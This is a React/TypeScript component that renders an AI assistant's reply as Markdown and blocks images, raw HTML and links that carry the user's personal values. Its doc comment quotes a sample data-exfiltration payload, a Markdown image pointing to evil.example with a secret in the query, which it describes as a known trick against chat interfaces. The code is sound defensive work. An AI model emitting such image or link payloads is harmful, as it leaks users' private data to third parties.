import Markdown, { type Components } from "react-markdown";
import { hrefContainsValue } from "./linkSafety";

/**
 * Renders the AI's reply as Markdown, safely:
 * - raw HTML in the reply is never interpreted (react-markdown escapes it; no rehype-raw)
 * - images are NOT loaded: a reply like ![x](https://evil.example/?q=<secret>) would otherwise make the browser send data to a
 *   third party (a known exfiltration trick against chat UIs). The image's alt text and address are shown instead.
 * - links open in a new tab without referrer; javascript: URLs are removed by react-markdown's default URL filter
 * - a link whose address contains one of the user's own (restored) values is shown as text, not as a link: clicking it would send that
 *   value to the link's owner (see linkSafety.ts)
 */
function makeComponents(sensitive: readonly string[]): Components {
  return {
    img: ({ alt, src }) => (
      <span className="md-img-blocked" title={typeof src === "string" ? src : undefined}>
        [image not loaded{alt ? `: ${alt}` : ""}]
      </span>
    ),
    a: ({ href, children }) =>
      hrefContainsValue(href, sensitive) ? (
        <span className="md-img-blocked" title="This link was removed because its address contains your personal data.">
          {children} [link removed: its address contained your personal data]
        </span>
      ) : (
        <a href={href} target="_blank" rel="noopener noreferrer nofollow">
          {children}
        </a>
      ),
  };
}

export function Reply({ text, sensitive = [] }: { text: string; sensitive?: readonly string[] }) {
  return (
    <div className="md">
      <Markdown components={makeComponents(sensitive)}>{text}</Markdown>
    </div>
  );
}
